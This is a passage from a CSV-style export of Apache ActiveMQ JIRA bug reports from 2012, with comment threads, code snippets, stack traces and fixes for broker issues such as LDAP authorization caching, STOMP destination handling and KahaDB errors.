20:59;chrisdrobison;Logs;;;","18/May/12 21:01;chrisdrobison;This is the code I use to wrap the ActiveMQ library that all my other software uses.;;;","18/May/12 21:09;chrisdrobison;Snippet of code used in the web portal to send messages and receive responses.;;;","18/May/12 21:12;chrisdrobison;ActiveMQ configuration files;;;","18/May/12 21:14;chrisdrobison;ActiveMQ server configuration files;;;","30/May/12 19:42;chrisdrobison;I profiled the server instance using YourKit while the flood was taking place. I've included the trace to hopefully help in the debugging process. I've found that when I disable any kind of authorization that things seems to work fine. Looking at the trace, it looks like there might be a problem related to the AuthorizationBroker, but I'm not sure.;;;","31/May/12 16:12;chrisdrobison;After more testing, I think there is a race condition in DefaultAuthorizationMap. Instead of going to LDAP, I defined the authorization entries in configuration and was able to reproduce the issue.;;;","31/May/12 20:31;chrisdrobison;I've done further testing, I now think the problem is higher up than the DefaultAuthorizationMap in the AuthorizationBroker. I created a very simple class that implements AuthorizationMap that always returns a static set of ACLs and I was able to reproduce the flooding.;;;","02/Oct/12 14:00;dejanb;Hi,

I see you're using some kind of a custom <solidInstanceCachedLDAPAuthorizationMap/> authorization plugin. Are you sure the problem isn't somewhere in there. 

Can you give Cached LDAP Authorization Module a try http://activemq.apache.org/cached-ldap-authorization-module.html and see if it helps.

Also, can you share more info on your further testings and how do you reproduce the problem;;;","02/Oct/12 15:18;chrisdrobison;No, I just made some changes so that the regular cachedLDAPAuthorizationMap would work with Active Directory. Those changes have now been put into trunk so I could still go back to using the regular one and still see the problem. In a previous comment I said that I wrote an extremely simple plugin that always returned the same ACLs and was still able to reproduce the problem. To reproduce the issue, I just setup a simple request/reply system using text messages. I believe I've attached the code I used. There was never a set number of messages I had to send before the flooding started. At first I was only able to reproduce the problem going over VPN, but eventually I was able to reproduce the problem between VMs.;;;","03/Oct/12 07:27;mbright;Hi.

I think we are seeing the same issue with fuse version 5.5.1-fuse-08-15 (was already the case for previous versions). We are running 2 brokers is a cluster with dynamic temporary queue forwarding. After some time, the 2 brokers get into some ""vicious circle"", whereby the same temporary queues are repeatedly added then removed from each of the brokers. As Chris mentions, this seems to use up a single thread on each process, presumably the thread removing & creating this temporary queues. It looks like the temporary queues are simply passed back and forth between the 2 brokers, and never get removed correctly. Only a restart of the brokers fixes the problem.;;;","03/Oct/12 07:35;mbright;Forgot to add: we are using the SimpleAuthenticationPlugin with a tempDestinationAuthorizationEntry in the AuthorizationMap.;;;","03/Oct/12 09:32;dejanb;Thanks for confirming. I see one potential problem that can cause it. I'll try to reproduce it now.;;;","04/Oct/12 11:40;dejanb;It should be fixed now with svn revision 1393988.

I did some refactoring of AdvisoryBroker to handle addDestinationInfo case properly.

Can you test the latest snapshot

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.8-SNAPSHOT/apache-activemq-5.8-20121004.112554-4-bin.tar.gz

and report back if you still see the problem.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Typos in protobuf specs + generated Java code for KahaDB,AMQ-3849,12556381,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,raulvk,raulvk,18/May/12 11:17,13/Jul/12 14:10,14/Jul/23 05:43,13/Jul/12 14:10,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"activemq-core/src/main/proto/journal-data.proto contains several typos in the word 'transaction', spelled as 'transaciton'. These typos also propagate to the Java code and the API, as a result of protobuf compilation.

Will submit a fix in the next hours.",,raulvk,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/May/12 11:24;raulvk;amq-proto-kahadb.diff;https://issues.apache.org/jira/secure/attachment/12528040/amq-proto-kahadb.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249834,,,Fri Jul 13 14:10:52 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahsf:",59155,,,,,,,,,,,,,,,,,,,,,"18/May/12 11:24;raulvk;Here goes the patch. Full compilation of the project tree OK. (Have not executed all unit tests).;;;","13/Jul/12 14:10;tabish;patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The JMX message move, copy and remove operation do not take messages in FIFO order",AMQ-3846,12556068,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,dlharp,dlharp,16/May/12 16:07,26/Jun/12 22:21,14/Jul/23 05:43,26/Jun/12 22:21,5.5.1,5.6.0,,,,5.7.0,,,JMX,,,,0,,,,,,,,,"When a page is pulled in, it is placed in a LinkedHashMap which preserves the queue order, but the below code then pulls the values from the LinkedHashMap and puts them in a Set.  This causes the FIFO order of the queue to be lost.  If the number of max messages to move is smaller the the page size, then the outcome looks like random messages from the queue being moved (copied or removed).

...

Set<MessageReference> set = new HashSet<MessageReference>();
       ConnectionContext context = createConnectionContext();
       do {
           doPageIn(true);
           pagedInMessagesLock.readLock().lock();
           try{
               set.addAll(pagedInMessages.values());
           }finally {
               pagedInMessagesLock.readLock().unlock();
           }
...

Can this be changed to preserve the queue order?",,dlharp,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249836,,,Tue Jun 26 22:21:12 UTC 2012,,,,,,,,,,,"0|i0ahsv:",59157,,,,,,,,,,,,,,,,,,,,,"25/Jun/12 18:20;tabish;Do you have a unit test case for this, would help to ensure any fix remains fixed in the future.;;;","26/Jun/12 22:21;tabish;Fix and new tests added to trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CachedLDAPAuthorizationMap doesn't handle the ldap connectino dying,AMQ-3845,12556038,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,leachim,leachim,16/May/12 14:05,11/Jun/12 09:29,14/Jul/23 05:43,11/Jun/12 09:29,5.6.0,,,,,5.7.0,,,Broker,,,,0,authorization,ldap,quick_to_fix,security,,,,,"If the ldap connection dies for some reason (ldap server restarting etc.), the broker will continue to attempt to use the old connection for authorization, resulting in all attempts to use the broker being denied.

In CachedLDAPAuthorizationMap.java, the open() function just returns the context if one exists. Instead, it should check to see if the context is still valid, and if not create one.

Alternatively, the caching of the ldap connection can be removed entirely, and then in the refreshInterval>0 case, a new ldap connection will be made each refresh interval (default setting: every 5 minutes).
i.e. delete these lines:
        if (context != null) {
            return context;
        }",,dejanb,leachim,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,600,600,,0%,600,600,,,,,,,,,,,,,,,,,,AMQ-3791,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249837,,,Mon Jun 11 09:29:00 UTC 2012,,,,,,,,,,,"0|i0aht3:",59158,,,,,,,,,,,,,,,,,,,,,"11/Jun/12 09:29;dejanb;Fixed with svn revision 1348761. I added some logic around handling a context and recreating it if necessary.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException when removing connection info,AMQ-3844,12556001,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,antonioderrico,antonioderrico,16/May/12 09:55,20/May/12 14:19,14/Jul/23 05:43,17/May/12 14:37,5.4.3,5.5.1,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Sometimes off and on the ActiveMQ server, the KahaDB maintains some old transactions that try to recovery. So at start up these transactions are added to the {{xaTransactions}} map inside {{TransactionBroker}} with a null {{ConnectionId}}.

This is the stack trace of the recovery at startup:

{code:none} 
	TransactionBroker.beginTransaction(ConnectionContext, TransactionId) line: 152	
	TransactionBroker$1.recover(XATransactionId, Message[], MessageAck[]) line: 92	
	KahaDBTransactionStore.recover(TransactionRecoveryListener) line: 317	
	TransactionBroker.start() line: 89	
	BrokerService$3.start() line: 1781	
	XBeanBrokerService(BrokerService).start() line: 489	
	XBeanBrokerService.afterPropertiesSet() line: 60	
	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method]	
	NativeMethodAccessorImpl.invoke(Object, Object[]) line: 39	
	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 25	
	Method.invoke(Object, Object...) line: 597	
	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).invokeCustomInitMethod(String, Object, RootBeanDefinition) line: 1536	
	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).invokeInitMethods(String, Object, RootBeanDefinition) line: 1477	
	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).initializeBean(String, Object, RootBeanDefinition) line: 1409	
	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).doCreateBean(String, RootBeanDefinition, Object[]) line: 519	
	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).createBean(String, RootBeanDefinition, Object[]) line: 456	
	AbstractBeanFactory$1.getObject() line: 291	
	DefaultListableBeanFactory(DefaultSingletonBeanRegistry).getSingleton(String, ObjectFactory) line: 222	
	DefaultListableBeanFactory(AbstractBeanFactory).doGetBean(String, Class<T>, Object[], boolean) line: 288	
	DefaultListableBeanFactory(AbstractBeanFactory).getBean(String) line: 190	
	DefaultListableBeanFactory.preInstantiateSingletons() line: 574	
	XBeanBrokerFactory$1(AbstractApplicationContext).finishBeanFactoryInitialization(ConfigurableListableBeanFactory) line: 895	
	XBeanBrokerFactory$1(AbstractApplicationContext).refresh() line: 425	
	XBeanBrokerFactory$1(ResourceXmlApplicationContext).<init>(Resource, List) line: 64	
	XBeanBrokerFactory$1(ResourceXmlApplicationContext).<init>(Resource) line: 52	
	XBeanBrokerFactory$1.<init>(XBeanBrokerFactory, Resource) line: 115	
	XBeanBrokerFactory.createApplicationContext(String) line: 115	
	XBeanBrokerFactory.createBroker(URI) line: 71	
	BrokerFactory.createBroker(URI, boolean) line: 71	
	BrokerFactory.createBroker(URI) line: 54	
	StartCommand.startBroker(URI) line: 115	
	StartCommand.runTask(List<String>) line: 74	
	StartCommand(AbstractCommand).execute(List<String>) line: 57	
	ShellCommand.runTask(List<String>) line: 143	
	ShellCommand(AbstractCommand).execute(List<String>) line: 57	
	ShellCommand.main(String[], InputStream, PrintStream) line: 85	
	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method]	
	NativeMethodAccessorImpl.invoke(Object, Object[]) line: 39	
	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 25	
	Method.invoke(Object, Object...) line: 597	
	Main.runTaskClass(List<String>) line: 251	
	Main.main(String[]) line: 107	 
{code} 

During the  runtime the client tries to add and remove connections; sometimes the removeConnection throws a NPE due to these transactions without ConnectionID.
Take a look to the code fragment from {{TransactionBroker}}:

{code:java}
    public void removeConnection(ConnectionContext context, ConnectionInfo info, Throwable error) throws Exception {
        for (Iterator<Transaction> iter = context.getTransactions().values().iterator(); iter.hasNext();) {
            try {
                Transaction transaction = iter.next();
                transaction.rollback();
            } catch (Exception e) {
                LOG.warn(""ERROR Rolling back disconnected client's transactions: "", e);
            }
            iter.remove();
        }

        synchronized (xaTransactions) {
            // first find all txs that belongs to the connection
            ArrayList<XATransaction> txs = new ArrayList<XATransaction>();
            for (XATransaction tx : xaTransactions.values()) {
                if (tx.getConnectionId().equals(info.getConnectionId()) && !tx.isPrepared()) {
                    txs.add(tx);
                }
            }

            // then remove them
            // two steps needed to avoid ConcurrentModificationException, from removeTransaction()
            for (XATransaction tx : txs) {
                try {
                    tx.rollback();
                } catch (Exception e) {
                    LOG.warn(""ERROR Rolling back disconnected client's xa transactions: "", e);
                }
            }

        }
        next.removeConnection(context, info, error);
    }
{code}

as you can see inside the loop there is a check for {{tx.getConnectionId().equals(info.getConnectionId())}} that throws the NPE. When this occurs the connection isn't removed. This information isn't shared with the client that believes the opposite, so the next time that try to resend client information to server obtain (under jBoss) this error {{javax.transaction.xa.XAException: Broker: AMQ - Client: ID:srv001-47592-1336730655955-64:2 already connected from /127.0.0.1:49806}}
that can be bound to the former server fails.
This scenario can be found inside the attached logs.
","Linux 2.6.18-274.12.1.el5 #1 SMP Tue Nov 29 13:37:35 EST 2011 i686 athlon i386 GNU/Linux, Java(TM) SE Runtime Environment (build 1.6.0_29-b11)",antonioderrico,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/May/12 10:18;antonioderrico;ActiveMQ_server.log;https://issues.apache.org/jira/secure/attachment/12527602/ActiveMQ_server.log","16/May/12 10:18;antonioderrico;jBoss_server.log;https://issues.apache.org/jira/secure/attachment/12527603/jBoss_server.log",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249838,,,Sun May 20 14:19:50 UTC 2012,,,,,,,,,,,"0|i0ahtb:",59159,,,,,,,,,,,,,,,,,,,,,"17/May/12 14:36;gtully;This has been fixed for 5.6, there is a now a null check before: {code}tx.getConnectionId().equals(info.getConnectionId(){code} in TransactionBroker
fix from https://issues.apache.org/jira/browse/AMQ-3305;;;","17/May/12 14:37;gtully;fix related to https://issues.apache.org/jira/browse/AMQ-3305;;;","20/May/12 14:19;antonioderrico;Thank you Gary, 

I look the code and I do some other test and all seems to be okay now.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mKahaDB causes ArrayIndexOutOfBoundsException on restart after deleting existing queues,AMQ-3841,12555856,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,matt_altermatt,matt_altermatt,15/May/12 18:26,31/May/12 15:35,14/Jul/23 05:43,22/May/12 19:48,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"To replicate, use these settings in the activemq.xml
{code}
		<persistenceAdapter>
			<mKahaDB directory=""${activemq.data}/kahadb"">
				<filteredPersistenceAdapters>
					<filteredKahaDB perDestination=""true"" >
						<persistenceAdapter>
							<kahaDB journalMaxFileLength=""32mb"" />
						</persistenceAdapter>
					</filteredKahaDB>
				</filteredPersistenceAdapters>
			</mKahaDB>
		</persistenceAdapter>
{code}

# Start the broker
# Create a queue
#* This will create the queue in the /kahadb folder
# Delete the queue
#* The queue is not deleted from the /kahadb folder
# Stop the broker
# Start the broker

This will cause cause the stack trace that is attached.

To fix this, delete the queue in the /kahadb folder and start the broker.  This allows the broker to start as normal.","Windows 7, JDK 6",matt_altermatt,mccarl1978,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/May/12 15:48;tabish;AMQ3841Test.java;https://issues.apache.org/jira/secure/attachment/12527849/AMQ3841Test.java","15/May/12 18:27;matt_altermatt;output.txt;https://issues.apache.org/jira/secure/attachment/12527492/output.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249839,,,Thu May 31 15:35:32 UTC 2012,,,,,,,,,,,"0|i0ahtj:",59160,,,,,,,,,,,,,,,,,,,,,"15/May/12 18:27;matt_altermatt;Stack trace from starting up the broker with a deleted queue.;;;","17/May/12 15:48;tabish;Unit test that can reproduce this issue.;;;","22/May/12 19:48;tabish;Fixed in trunk test updated to show that a destination can be removed and then later re-added without issue.;;;","31/May/12 13:52;mccarl1978;I have one comment on the patch that fixes this issue. The KahaDBStore.getDestinations() method looks as though it would be pretty heavy, performance wise. Should the resultant List be cached instead of retrieved twice, once for .size() and once for .toArray() (lines 321 & 322)?;;;","31/May/12 15:35;tabish;Done, updated in trunk, should see it in the next nightly.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stale release under http://www.apache.org/dist/activemq/activemq-cpp/source/,AMQ-3840,12555172,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,sebb,sebb,14/May/12 18:09,14/May/12 21:30,14/Jul/23 05:43,14/May/12 21:30,,,,,,,,,,,,,0,,,,,,,,,"The directory http://www.apache.org/dist/activemq/activemq-cpp/source/ contains the superseded release 3.4.1; it should be removed now that 3.4.2 has been out for a while",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,239424,,,2012-05-14 18:09:44.0,,,,,,,,,,,"0|i0tsbz:",171899,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken link,AMQ-3839,12555171,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,sebb,sebb,14/May/12 18:07,14/May/12 18:15,14/Jul/23 05:43,14/May/12 18:15,,,,,,,,,,,,,0,,,,,,,,,"http://activemq.apache.org/index.html

contains:

<a class=""blogHeading"" href=""2012/04/27/activemq-cpp-version-342-released.html"">ActiveMQ-CPP Version 3.4.2 Released</a>
...

<p>The newest release of <a href=""../AMQCPP/index.html"" title=""Index"">ActiveMQ-CPP</a> is out, you can download the source bundles <a href=""../AMQCPP/activemq-cpp-342-release.html"" title=""ActiveMQ-CPP 3.4.2 Release"">here</a>.</p>

The page http://activemq.apache.org/AMQCPP/index.html does not exist",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,239423,,,Mon May 14 18:15:06 UTC 2012,,,,,,,,,,,"0|i0tsbr:",171898,,,,,,,,,,,,,,,,,,,,,"14/May/12 18:15;tabish;Wiki upadted, will show up on the next site refresh.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerFacade returns more connections than expect when call  getConnections by connector name,AMQ-3837,12555021,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,wangyin,wangyin,12/May/12 15:14,17/Jul/12 23:04,14/Jul/23 05:43,08/Jun/12 16:44,5.5.1,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"When a client has connected to broker,we can see more than one rows of connections via web console on page titled connections.",,donnchadh,rajdavies,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/May/12 15:15;wangyin;BrokerFacadeSupport.java.patch;https://issues.apache.org/jira/secure/attachment/12526641/BrokerFacadeSupport.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,239275,,,Fri Jun 08 16:44:12 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahtr:",59161,,,,,,,,,,,,,,,,,,,,,"08/Jun/12 16:44;rajdavies;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP 1.0 protocol (SUBSCRIBE destination) broken on ActiveMQ 5.6.0,AMQ-3836,12554913,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,dmichellis,dmichellis,11/May/12 14:31,31/May/12 20:27,14/Jul/23 05:43,31/May/12 20:27,5.6.0,,,,,5.7.0,,,STOMP,,,,2,,,,,,,,,"Destination specification on STOMP using activemq 5.6.0 is broken.

Before 5.6.0, you had to specify ""/queue/my_queue"". Now, activemq automatically includes a ""/queue/"" on destination name, whether needed or not.

For instance, sending messages to ""/queue/nagios-events"" works. Subscribing to ""/queue/nagios-events"" creates an additional queue named ""/queue/queue/nagios-events"".

Message sending is also affected, although it accepts both ""/queue/nagios-events"" and ""nagios-events""","Centos 5 running Apache ActiveMQ 5.6.0, jre-1.6.0_20-fcs",giles7777,pedrografael,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/May/12 18:19;giles7777;firsttony.php;https://issues.apache.org/jira/secure/attachment/12530245/firsttony.php",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,239166,,,Thu May 31 20:27:43 UTC 2012,,,,,,,,,,,"0|i0ahtz:",59162,,,,,,,,,,,,,,,,,,,,,"11/May/12 14:44;tabish;Recommend you create a JUnit test case to demonstrate your issue.;;;","11/May/12 14:48;dmichellis;I have absolutely no idea how to do that. I am not a java guy, sorry;;;","11/May/12 14:58;tabish;StompTest.java in our unit tests has plenty of examples, barring that please create a test case using the client you are currently using.  ;;;","14/May/12 14:43;tabish;You'll need to provide a test case, can't reproduce this so far.;;;","30/May/12 18:12;giles7777;I'm seeing the same problem.  We're using a modified first.php from the fuse php client.  I'll clean it up and attach it.;;;","30/May/12 18:19;giles7777;modified first.php from fuse stomp php client.  the result on 5.5.1 comes back as:

Notice the destination has a /queue on it in 5.6.0  We checked the STOMP frame and its not coming from the client.

In 5.5.1 we get this result:

Received headers
s_scale => 0.001
message-id => ID:tony-desktop-53600-1338396365864-2:12:-1:1:1
d_serviceName => ModelUpload
destination => /topic/testtopic
timestamp => 1338399414341
s_modelID => 123456
expires => 0
priority => 4

In 5.6.0 we get this result:

Received headers
s_scale =>  0.001
message-id => ID:maker-55961-1338400788753-2:2:-1:1:1
d_serviceName =>  ModelUpload
destination => /queue//topic/testtopic
timestamp => 1338401617112
s_modelID =>  123456
expires => 0
priority => 4



Here is the frame that was sent:

SEND
d_serviceName: ModelUpload
s_modelID: 123456
s_scale: 0.001
destination: /topic/testtopic

test


---
I suspect its something in the FrameTranslator, digging in there.  ;;;","30/May/12 18:23;tabish;Why not try and reproduce it with a JUnit test?  There's already a large number of them in StompTest.java to work from.;;;","30/May/12 18:27;giles7777;I will.  Just getting my head around the problem, so far we're learning stomp from the php client.  ;;;","30/May/12 23:40;giles7777;The issue is with STOMP clients that put spaces after values as in destination: /topic/test

The convert destination method in LegacyFrameTranslator does a startsWith(""/topic"") to detect topics.  

The fuse stomp php client puts a space on items.  My read of the stomp spec shows examples without it.  But it doesn't really make it clear.  We're looking around at a few other clients to see what they do.

If its common of clients then it might make sense to deal with it on the server.  The other php stomp client does not put spaces in its values.  

I can easily make a junit test for this case if you want it, but I kinda expect this will be labeled under ""client error"" or maybe incomplete spec language(my pet peeve).  ;;;","31/May/12 18:24;giles7777;I found this language in the STOMP specification under Value Encoding:

The STOMP 1.0 specification included many example frames with padding in the headers and many servers and clients were implemented to trim or pad header values. This causes problems if applications want to send headers that SHOULD not get trimmed. In STOMP 1.1, clients and servers MUST never trim or pad headers with spaces.


So I believe we should not do any space removal.  I think this ticket can be closed.;;;","31/May/12 18:34;tabish;Agreed the spec was a bit vague in this regard.  In 5.6 we removed the header trimming in order to not discard spaces that a client had intentionally placed there.  It might be good to at least do a test on a trimmed destination value before assuming its a queue and getting into this scenario.;;;","31/May/12 20:27;tabish;Fixed to attempt to find the right destination with spaces padding trimmed before falling back to the configured fallback handler.  Also updated the Stomp PHP client to not pad headers.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade maven-bundle-plugin,AMQ-3832,12554462,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,09/May/12 10:42,11/May/12 08:37,14/Jul/23 05:43,11/May/12 08:37,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"We have been hit by https://issues.apache.org/jira/browse/FELIX-3058 during 5.6.0 release, so some of the modules don't have source jars in it. We should upgrade to 2.3.6 bundle plugin and see how to provide those source jars (if possible) for 5.6.0 release.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,238704,,,Fri May 11 08:37:58 UTC 2012,,,,,,,,,,,"0|i0ahu7:",59163,,,,,,,,,,,,,,,,,,,,,"09/May/12 10:56;dejanb;Upgraded bundle plugin to 2.3.7 with svn revision 1336078;;;","11/May/12 08:37;dejanb;source artifacts has been created and added to the repo.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exit code is not properly returned when using RUN_AS_USER,AMQ-3831,12554314,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,carlos,carlos,08/May/12 12:34,17/Jul/12 23:04,14/Jul/23 05:43,09/May/12 20:07,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"There was an issue in the init.d scripts generated by the maven appassembler plugin that is in ActiveMQ too

http://jira.codehaus.org/browse/MAPPASM-113

{quote}
When using RUN_AS_USER (set to a different user than the current one) su is called to call the script again. The return code of the called script is later ignored and 0 is always returned.

